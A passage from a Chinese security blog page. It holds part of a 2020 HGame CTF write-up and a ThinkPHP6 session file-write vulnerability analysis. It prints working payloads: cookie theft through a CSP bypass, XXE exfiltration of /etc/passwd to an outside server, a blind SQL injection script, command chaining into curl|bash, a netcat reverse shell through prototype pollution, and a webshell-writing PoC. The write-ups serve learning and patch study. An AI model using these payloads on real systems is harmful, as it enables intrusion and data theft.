    temp=&#39;&#39;
    for i in cha:
        if sql_inj(&quot;(select substr(hex(group_concat(name,&#39;,&#39;,password)),%d,1) FROM user where id=1)=&#39;%s&#39;&quot; % (p,i) ):
            result+=i
            temp=i
            print(result)
            break
    if temp!=result[-1]:
        break

#information_schema,babysql
#messages,user
#id,name,password
</code></pre>
<h3 id="Cosmos的聊天室2-0"><a href="#Cosmos的聊天室2-0" class="headerlink" title="Cosmos的聊天室2.0"></a>Cosmos的聊天室2.0</h3><p>操操操,这题对我有毒,我这里不显示csp,导致我卡了很久</p>
<p>存在csp:</p>
<pre><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></pre><p>先检测一下</p>
<p> <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a> </p>
<p><img src="https://i.loli.net/2020/02/06/xmcQvbWV7EXRisq.png" alt="image19320"></p>
<p>说object-src不安全</p>
<p>这个策略已经ban掉了内联脚本,所以我们直接传一个js代码过去没用</p>
<p>我们对send方法进行检测发现,会过滤script,但是用双写就可以绕过,还会把大写转成小写</p>
<p>用burp代理,查看发送的请求,我们可以会注意到<code>/send</code>会直接返回我们发送的内容,利用这个恰好可以绕过<code>script-src &#39;self&#39;</code> ,</p>
<p>我们发送以下payload(用script标签也一样)</p>
<pre><code>&lt;iframe src=&quot;send?message=%3c%73%76%67%20%6f%6e%6c%6f%61%64%3d%22%61%6c%65%72%74%28%29%22%3e&quot;&gt;&lt;/iframe&gt;</code></pre><p>成功弹窗,但是我们还有<code>default-src &#39;self&#39;</code>阻碍着我们带回数据</p>
<p>因为没有设置<code>object-src</code>我们可以用<code>embed</code>标签带回数据</p>
<p>最后的payload</p>
<pre><code>&lt;iframe src=&quot;send?message=&lt;body&gt;&lt;scscrscriptiptript&gt;
var+iframe+%3d+eval(%22document.create\105lement(&#39;embed&#39;)%22)%3b
iframe.src%3d%22http%3a//39.108.164.219%3a60005/%3f%22%2bdocument.cookie%3b
eval(%22document.body.append\103hild(iframe)%22)%3b&lt;/scrscrscriptiptipt&gt;&lt;/body&gt;&quot;&gt;&lt;/iframe&gt;</code></pre><p><code>hgame{1ts_@_$impL3_CSP_bYp4ss1ng_Ch@!!enge.}</code></p>
<h3 id="代打出题人服务中心"><a href="#代打出题人服务中心" class="headerlink" title="代打出题人服务中心"></a>代打出题人服务中心</h3><p>一看就知道有xxe漏洞</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE r [
&lt;!ELEMENT r ANY &gt;
&lt;!ENTITY % sp SYSTEM &quot;http://39.108.164.219:60005/evil.xml&quot;&gt;
%sp;
%param1;
]&gt;
&lt;r&gt;&amp;exfil;&lt;/r&gt;

File stored on http://39.108.164.219/evil.xml
&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;
&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http://39.108.164.219:60005/?a=%data;&#39;&gt;&quot;&gt;</code></pre><p>submit.php</p>
<pre><code class="php">&lt;?php
include &quot;config.php&quot;;
$result = null;
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents(&#39;php://input&#39;);

try{
    $stmt = $conn-&gt;prepare(&quot;INSERT INTO info (id, chal_name, bd_level, bd_time) VALUES (:id, :chal_name, :bd_level, :bd_time)&quot;);
    $stmt-&gt;bindParam(&#39;:id&#39;, $id);
    $stmt-&gt;bindParam(&#39;:chal_name&#39;, $chal_name);
    $stmt-&gt;bindParam(&#39;:bd_level&#39;, $level);
    $stmt-&gt;bindParam(&#39;:bd_time&#39;, $level);

    $dom = new DOMDocument();
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $id = $creds-&gt;id;
    $chal_name = $creds-&gt;name;
    $level = $creds-&gt;level;
    $time = $creds-&gt;time;
    if ($id == &quot;&quot; || $level == &quot;&quot; || $chal_name == &quot;&quot;|| $time == &quot;&quot;) {
        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;请填写信息！&quot;);
        die($result);
    }
    $stmt-&gt;execute();
    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,&quot;已提交成功，正在为您安排打手&quot;);
}catch(Exception $e){
    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;提交失败！&quot;);
}
header(&#39;Content-Type: text/html; charset=utf-8&#39;);
echo $result;
?&gt;</code></pre>
<p>config.php</p>
<pre><code class="php">&lt;?php
$dbms=&#39;mysql&#39;;
$host=&#39;localhost&#39;;
$dbName=&#39;bdctr_message&#39;;
$user=&#39;root&#39;;
$pass=&#39;yevi1gcqpqHSaOZVDI1CcRLaHHSJ5BYgImof&#39;;

$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;
$conn = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));
$conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

?&gt;</code></pre>
<p>原本想着用gopher执行sql语句,但是有密码无法执行</p>
<p>我我我我是个dsb,明明知道可能是内网有可能由其他主机,但就是不试一下</p>
<pre><code>IP address       HW type     Flags       HW address            Mask     Device
172.21.0.5       0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.1       0x1         0x2         02:42:f7:6e:6f:34     *        eth0
172.21.0.6       0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.2       0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.32      0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.75      0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.7       0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.76      0x1         0x2         02:42:ac:15:00:4c     *        eth0
172.21.0.30      0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.77      0x1         0x0         00:00:00:00:00:00     *        eth0
</code></pre><pre><code>127.0.0.1    localhost
::1    localhost ip6-localhost ip6-loopback
fe00::0    ip6-localnet
ff00::0    ip6-mcastprefix
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
172.21.0.76    hgame-private
172.21.0.31    f9f1b9b99e13</code></pre><p>发现一个内网服务器<code>172.21.0.76</code></p>
<p>当尝试访问80端口时,发现文件太大等一系列问题</p>
<blockquote>
<p>使用libxml读取文件时,文件不能太大否则会报错</p>
</blockquote>
<p>于是尝试压缩能不能读取</p>
<pre><code>&lt;?php
    error_reporting(0);
    file_put_contents(&quot;tmp&quot;,base64_decode(str_replace(&#39; &#39;,&#39;+&#39;,$_GET[&#39;a&#39;])));
    $a=file_get_contents(&quot;php://filter/read=zlib.inflate/resource=tmp&quot;);
    file_put_contents(&quot;mes/&quot;.date(&quot;h_m_s&quot;).&quot;.txt&quot;,$a);
?&gt;
</code></pre><pre><code>&lt;!ENTITY % data SYSTEM &quot;php://filter/zlib.deflate/convert.base64-encode/resource=http://172.21.0.76&quot;&gt;
&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http://39.108.164.219:60005/?a=%data;&#39;&gt;&quot;&gt;</code></pre><pre><code class="php">&lt;?php
error_reporting(0);

$token = @$_GET[&#39;token&#39;];
if (!isset($token)) {
    die(&quot;请带上您的队伍token访问! /?token=&quot;);
}
$api = &quot;http://checker/?token=&quot;.$token;
$t = file_get_contents($api);
if($t !== &quot;ok&quot;) {
    die(&quot;队伍token错误&quot;);
}

highlight_file(__FILE__);

$sandbox = &#39;/var/www/html/sandbox/&#39;. md5(&quot;hgame2020&quot; . $token);;
@mkdir($sandbox);
@chdir($sandbox);

$content = $_GET[&#39;v&#39;];
if (isset($content)) {
    $cmd = substr($content,0,5);
    system($cmd);
}else if (isset($_GET[&#39;r&#39;])) {
    system(&#39;rm -rf ./*&#39;);
}

/*   _____ _    _ ______ _      _        _____ ______ _______   _____ _______   _
  / ____| |  | |  ____| |    | |      / ____|  ____|__   __| |_   _|__   __| | |
 | (___ | |__| | |__  | |    | |     | |  __| |__     | |      | |    | |    | |
  \___ \|  __  |  __| | |    | |     | | |_ |  __|    | |      | |    | |    | |
  ____) | |  | | |____| |____| |____ | |__| | |____   | |     _| |_   | |    |_|
 |_____/|_|  |_|______|______|______( )_____|______|  |_|    |_____|  |_|    (_)
                                    |/

*/</code></pre>
<p>然后利用 <a href="https://err0rzz.github.io/2017/11/13/ctf命令执行与绕过/" target="_blank" rel="noopener">https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/</a> </p>
<p>的方法来执行命令</p>
<pre><code class="php">
&lt;?php
    $a=file_get_contents(&quot;tmp.xml&quot;);
    $command=array(
    &#39;&gt;ls\\\\&#39;, 
    &#39;ls&gt;_&#39;, 
    &#39;&gt;\\ \\\\&#39;, 
    &#39;&gt;-t\\\\&#39;, 
    &#39;&gt;\\&gt;g&#39;, 
    &#39;ls&gt;&gt;_&#39;,

    &quot;&gt;bash&quot;,
    &quot;&gt;\\|\\\\&quot;,
    &quot;&gt;5\\\\&quot;,
    &quot;&gt;00\\\\&quot;,
    &quot;&gt;60\\\\&quot;,
    &quot;&gt;9:\\\\&quot;,
    &quot;&gt;21\\\\&quot;,
    &quot;&gt;4.\\\\&quot;,
    &quot;&gt;16\\\\&quot;,
    &quot;&gt;8.\\\\&quot;,
    &quot;&gt;10\\\\&quot;,
    &quot;&gt;9.\\\\&quot;,
    &quot;&gt;3\\\\&quot;,
    &quot;&gt;\\ \\\\&quot;,
    &quot;&gt;rl\\\\&quot;,
    &quot;&gt;cu\\\\&quot;
    );
    foreach($command as $v)
    {
        echo $v.&quot;\n&quot;;
        $v=urlencode($v);
        file_put_contents(&quot;evil.xml&quot;,str_replace(&quot;TGT&quot;,$v,$a));
        $postdata=&lt;&lt;&lt;MRK
&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE msg [
&lt;!ELEMENT msg ANY &gt;
&lt;!ENTITY % sp SYSTEM &quot;http://39.108.164.219:60005/evil.xml&quot;&gt;
%sp;
%param1;
]&gt;
&lt;msg&gt;&lt;id&gt;&amp;exfil;&lt;/id&gt;&lt;name&gt;b&lt;/name&gt;&lt;level&gt;c&lt;/level&gt;&lt;time&gt;d&lt;/time&gt;&lt;/msg&gt;
MRK;
        $opts = array(&#39;http&#39; =&gt; 
        array( &#39;method&#39;  =&gt; &#39;POST&#39;,
        &#39;header&#39;  =&gt; &#39;Content-type: application/x-www-form-urlencoded&#39;,
        &#39;content&#39; =&gt; $postdata ) 
    );
        $context = stream_context_create($opts);
        file_get_contents(&quot;http://bdctr.hgame.day-day.work/submit.php&quot;, false, $context);

    }


?&gt;
</code></pre>
<p>在经历一次rm -rf 之后,终于拿到getshell</p>
<p><img src="https://i.loli.net/2020/02/17/IDFPmldJKNhEHt7.png" alt="image26112"></p>
<p><code>hgame{XxE!@SsrF_4nD_f1lt3rEd_Rc3_1s_Co0l!}</code></p>
<h3 id="sekiro"><a href="#sekiro" class="headerlink" title="sekiro"></a>sekiro</h3><p>刚拿到题目的时候,我心态被第一题搞崩了,随便看了一下,就溜去打游戏了,看了wp,艹</p>
<p>拿到题目,是我不熟悉的nodejs</p>
<p>影响不大,看个大概就会了</p>
<p><code>\route\index.js</code></p>
<pre><code class="javascript">router.post(&#39;/action&#39;, function (req, res) {
  if (!req.session.sekiro) {
    res.end(&quot;Session required.&quot;)
  }
  if (!req.session.sekiro.alive) {
    res.end(&quot;You dead.&quot;)
  }
  var body = JSON.parse(JSON.stringify(req.body));//原型链污染起点
  var copybody = clone(body)
  if (copybody.solution) {
    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)
  }
  res.end(&quot;提交成功&quot;+JSON.stringify(req.body))
})</code></pre>
<p>在注释处有一个奇怪的操作,转成json再转成解析成obj</p>
<p>这摆明了有问题,遇到<code>JSON.parse+merge</code> ,思路可以往原型链污染上走一走</p>
<p>我们继续阅读代码</p>
<p>跟进dealWithAttacks</p>
<pre><code class="javascript">this.dealWithAttacks = function (sekiro, solution) {
        if (sekiro.attackInfo.solution !== solution) {
            sekiro.health -= sekiro.attackInfo.attack
            if (sekiro.attackInfo.additionalEffect) {
                var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)
                sekiro = fn(sekiro)//look this
            }
        }
        sekiro.posture = (sekiro.posture &lt;= 500) ? sekiro.posture : 500
        sekiro.health = (sekiro.health &gt; 0) ? sekiro.health : 0
        if (sekiro.posture == 500 || sekiro.health == 0) {
            sekiro.alive = false
        }
        return sekiro
    }</code></pre>
<pre><code class="javascript">var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)
                sekiro = fn(sekiro)</code></pre>
<p>明显的代码执行,如果我们能控制<code>sekiro.attackInfo.additionalEffect</code>,那么便可以执行任意代码了</p>
<p>我们看一下<code>sekiro.attackInfo.additionalEffect</code>是如何获得的</p>
<pre><code class="javascript">this.attacks = [
        {
            &quot;method&quot;: &quot;连续砍击&quot;,
            &quot;attack&quot;: 1000,
            &quot;additionalEffect&quot;: &quot;sekiro.posture+=100&quot;,
            &quot;solution&quot;: &quot;连续格挡&quot;
        },
        {
            &quot;method&quot;: &quot;普通攻击&quot;,
            &quot;attack&quot;: 500,
            &quot;additionalEffect&quot;: &quot;sekiro.posture+=50&quot;,
            &quot;solution&quot;: &quot;格挡&quot;
        },
        {
            &quot;method&quot;: &quot;下段攻击&quot;,
            &quot;attack&quot;: 1000,
            &quot;solution&quot;: &quot;跳跃踩头&quot;
        },
        {
            &quot;method&quot;: &quot;突刺攻击&quot;,
            &quot;attack&quot;: 1000,
            &quot;solution&quot;: &quot;识破&quot;
        },
        {
            &quot;method&quot;: &quot;巴之雷&quot;,
            &quot;attack&quot;: 1000,
            &quot;solution&quot;: &quot;雷反&quot;
        },
    ]
    this.getAttackInfo = function () {
        return this.attacks[Math.floor(Math.random() * this.attacks.length)]
    }</code></pre>
<p>是从<code>attacks</code>中随机挑一个拿出来的,而其中某些是没有<code>additionalEffect</code>属性的</p>
<p>根据js根据原型链来查找属性的特性</p>
<p>我们可以用原型链污染来修改Object的additionalEffect属性</p>
<p>payload:</p>
<pre><code>POST /action HTTP/1.1
Host: sekiro.hgame.babelfish.ink
Content-Length: 169
Pragma: no-cache
Cache-Control: no-cache
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
Content-Type: application/json; charset=UTF-8
Referer: http://sekiro.hgame.babelfish.ink/
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: session=s%3A1PZpvTS3HgeMcmNynPUdu4Yd8B4A7Rlt.c2nTB%2F99oXNjyJljMJ0HZugi0SJnsE4juq2ZboRTH0g
Connection: close

{&quot;solution&quot;:123,&quot;__proto__&quot;:{&quot;additionalEffect&quot;:&quot;global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;nc 39.108.164.219 60000 -e /bin/sh&#39;,function(){});&quot;}}</code></pre><p>content-type要设置成<code>Content-Type: application/json</code></p>
<p>不然<code>__proto__</code>是无法当初键的,那么merge也就没用了</p>
<p><code>hgame{j@v4scr1pt_pr0t0tYp3-poLLut1on_4tt4ck_1s_d@ng3r20us}</code></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h3><p> <a href="http://rumkin.com/tools/cipher/morse.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/morse.php</a> </p>
<h3 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h3><p>就说说咋拿到密码的</p>
<p>压缩文件提示<code>End of Zip archive, comment: &quot;Password is picture ID.&quot;</code></p>
<p>利用搜索引擎(<code>Pixiv@純白可憐</code>)拿到密码</p>
<h3 id="克苏鲁神话"><a href="#克苏鲁神话" class="headerlink" title="克苏鲁神话"></a>克苏鲁神话</h3><p>解压得到一个文本和一个压缩包</p>
<p>观察文本和压缩包发现,二者的CRC值相同,于是考虑用明文攻击(不好意思,我是看着wiki遍历过去的)</p>
<p>然后拿到里面的word文档,但是是加密的,猝.</p>
<p>在看一下那个文本,有点像培根密码</p>
<pre><code class="python">s=&quot;of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.&quot;.replace(&quot; &quot;,&quot;&quot;)[:-1]
result=&quot;&quot;
for i in range(0,len(s),5):
    temp=&quot;&quot;
    for j in range(5):
        if s[i+j]==s[i+j].lower():
            temp+=&quot;0&quot;
        else :
            temp+=&quot;1&quot;
    result+=chr(int(temp,2)+ord(&#39;A&#39;))
print(result)</code></pre>
<p>于是拿到密码(HIDDENINTHEDOC),但是还没到头!!!!!百度一下word隐写,最后拿到flag</p>
<h3 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h3><p>解压得到password.txt和ok.zip</p>
<p>根据password.txt的提示,栅栏解密+凯撒密码得到压缩包密码.</p>
<p>拿到一堆ook直接上谷歌.ok了</p>
<p>base32-&gt;base64-&gt;二维码</p>
<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h3><p>直接套脚本</p>
<h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><pre><code class="python">#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import gmpy2
from secret import A, B, flag
assert flag.startswith(&#39;hgame{&#39;) and flag.endswith(&#39;}&#39;)

TABLE = &#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;
MOD = len(TABLE)

cipher = &#39;&#39;
for b in flag:
    i = TABLE.find(b)
    if i == -1:
        cipher += b
    else:
        ii = (A*i + B) % MOD
        cipher += TABLE[ii]

print(cipher)
# A8I5z{xr1A_J7ha_vG_TpH410}</code></pre>
<p>我们观察可以发现这其实是个单表替换加密</p>
<p>那么我们只要生成生成一个加密表就可以很容易的求出加密内容</p>
<p>但是唯一麻烦的是我们不知道A,B,但是我们知道明文的前几个字符hgame</p>
<p>于是有</p>
<pre><code class="python">TABLE = &#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;
MOD = len(TABLE)
cipher=&quot;A8I5z{xr1A_J7ha_vG_TpH410}&quot;

for A in range(1,MOD):
    for B in range(1,MOD):
        result=&quot;&quot;
        try :
            #生成加密表
            TABLE2={}
            for b in TABLE:
                i=TABLE.find(b)
                TABLE2[TABLE[(A*i + B) % MOD]]=b
            #解密
            for b in cipher:
                ii=TABLE.find(b)

                if ii==-1:
                    result+=b
                else :
                    result+=TABLE2[b]
        except :
            pass
        if &quot;hgame&quot; in result:
            print(result)
</code></pre>
<h3 id="Reorder"><a href="#Reorder" class="headerlink" title="Reorder"></a>Reorder</h3><p>这个是位置移动加密,输入一个和flag长度相同的字符串就知道如何解密了</p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><p>覆盖变量值来执行后门函数</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/07/2020hgame/">http://blog.ccreater.top/2020/02/07/2020hgame/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/02/07/2020hgame/" data-id="cka3ckr1i0000v4v0dupneumy" data-title="2020hgame" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-ThinkPHP6 任意文件操作漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
  <time class="dt-published" datetime="2020-02-01T09:08:34.153Z" itemprop="datePublished">2020-02-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP6 任意文件操作漏洞分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP6-任意文件操作漏洞分析"><a href="#ThinkPHP6-任意文件操作漏洞分析" class="headerlink" title="ThinkPHP6 任意文件操作漏洞分析"></a>ThinkPHP6 任意文件操作漏洞分析</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
<li>ThinkPHP6.0.0-6.0.1</li>
<li>开启Sessoin中间件</li>
</ol>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>官方commit: <a href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a> </p>
<p>复现环境为:phpstudy+thinkphp6.0.1</p>
<p><code>\app\controller\index.php</code>:</p>
<pre><code class="php">&lt;?php
namespace app\controller;

use app\BaseController;
use think\facade\Session;
class Index extends BaseController
{
    public function index($name)
    {
        Session::set(&#39;name&#39;, $name);
        return &#39;hello,&#39; . Session::get(&#39;name&#39;);;
    }

}</code></pre>
<p><code>\app\middleware.php</code></p>
<pre><code class="php">&lt;?php
// 全局中间件定义文件
return [
    // 全局请求缓存
    // \think\middleware\CheckRequestCache::class,
    // 多语言加载
    // \think\middleware\LoadLangPack::class,
//     Session初始化
     \think\middleware\SessionInit::class
];</code></pre>
<p>根据漏洞的信息(任意文件操作),我们从<code>vendor\topthink\framework\src\think\session\Store.php</code> 的<code>save</code>函数开始进行分析</p>
<pre><code class="php">public function save(): void
    {
        $this-&gt;clearFlashData();//清除原来的数据

        $sessionId = $this-&gt;getId();

        if (!empty($this-&gt;data)) {
            $data = $this-&gt;serialize($this-&gt;data);

            $this-&gt;handler-&gt;write($sessionId, $data);
        } else {
            $this-&gt;handler-&gt;delete($sessionId);
        }

        $this-&gt;init = false;
    }</code></pre>
<p>跟进<code>$this-&gt;handler-&gt;write</code>方法看一下</p>
<pre><code class="php">public function write(string $sessID, string $sessData): bool
    {
        $filename = $this-&gt;getFileName($sessID, true);
        $data     = $sessData;

        if ($this-&gt;config[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {
            //数据压缩
            $data = gzcompress($data, 3);
        }

        return $this-&gt;writeFile($filename, $data);
    }</code></pre>
<p>再跟进<code>$this-&gt;writeFile</code></p>
<pre><code class="php">protected function writeFile($path, $content): bool
    {
        return (bool) file_put_contents($path, $content, LOCK_EX);
    }</code></pre>
<p>因为<code>$data</code>可控,那么我们只要能控制<code>$path</code>我们就可以写shell进去了</p>
<p>而<code>$path</code>由<code>$this-&gt;getFileName($sessID, true);</code>得到</p>
<p>跟进去</p>
<pre><code class="php">    protected function getFileName(string $name, bool $auto = false): string
    {
        if ($this-&gt;config[&#39;prefix&#39;]) {
            // 使用子目录
            $name = $this-&gt;config[&#39;prefix&#39;] . DIRECTORY_SEPARATOR . &#39;sess_&#39; . $name;
        } else {
            $name = &#39;sess_&#39; . $name;
        }

        $filename = $this-&gt;config[&#39;path&#39;] . $name;
        $dir      = dirname($filename);

        if ($auto &amp;&amp; !is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }

        return $filename;
    }</code></pre>
<p><code>$filename</code>直接由末端拼接参数<code>$name</code></p>
<p>而<code>write</code>调用<code>getFileName</code>时直接将参数<code>$sessID</code>传入,<code>$sessID</code>由<code>$sessionId = $this-&gt;getId();</code>获得</p>
<pre><code class="php">    public function getId(): string
    {
        return $this-&gt;id;
    }</code></pre>
<p><code>$this-&gt;id</code>时通过<code>setId()</code>来设置的</p>
<pre><code class="php">    public function setId($id = null): void
    {
        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());
    }</code></pre>
<p>如果<code>is_string($id) &amp;&amp; strlen($id) === 32</code>满足,则直接将<code>$id</code>的值赋给<code>$this-&gt;id</code></p>
<p>查找调用setId的函数</p>
<p><img src="https://i.loli.net/2020/02/01/cAes3Wot8BFbkjP.png" alt="image3070"></p>
<p>其中<code>SessionInit</code></p>
<pre><code class="php">    public function handle($request, Closure $next)
    {
        // Session初始化
        $varSessionId = $this-&gt;app-&gt;config-&gt;get(&#39;session.var_session_id&#39;);
        $cookieName   = $this-&gt;session-&gt;getName();

        if ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) {
            $sessionId = $request-&gt;request($varSessionId);
        } else {
            $sessionId = $request-&gt;cookie($cookieName);
        }

        if ($sessionId) {
            $this-&gt;session-&gt;setId($sessionId);
        }
    }</code></pre>
<p>查找配置发现<code>$sessionId</code>=&gt;<code>$_COOKIE[&#39;PHPSESSID&#39;]</code></p>
<p>因此构造payload</p>
<pre><code>http://127.0.0.1/tp/public/index.php?s=/index/index/&amp;name=%3C?php%20phpinfo();?%3E

Cookie :PHPSESSID=9f7777c08f3909751b148338ba08.php

访问http://127.0.0.1/tp/runtime/session/sess_9f7777c08f3909751b148338ba08.php</code></pre><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><pre><code class="php">public function setId($id=null):void
{
    $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 &amp;&amp; ctype_alnum($id) ? $id : md5(microtime(true) . session_create_id());
}</code></pre>
<p>在<code>setId</code>中增加了对<code>$id</code>的校验:<code>ctype_alnum($id)</code>,只允许数字或字母,来避免任意文件操作</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://paper.seebug.org/1114/#_1" target="_blank" rel="noopener">https://paper.seebug.org/1114/#_1</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/02/01/ThinkPHP6">http://blog.ccreater.top/2020/02/01/ThinkPHP6</a> 任意文件操作漏洞分析/](<a href="http://blog.ccreater.top/2020/02/01/ThinkPHP6">http://blog.ccreater.top/2020/02/01/ThinkPHP6</a> 任意文件操作漏洞分析/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="cka3ckr2c0011v4v08z7p73pm" data-title="ThinkPHP6 任意文件操作漏洞分析" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/3/">&lt;- Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/5/">Next -&gt;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
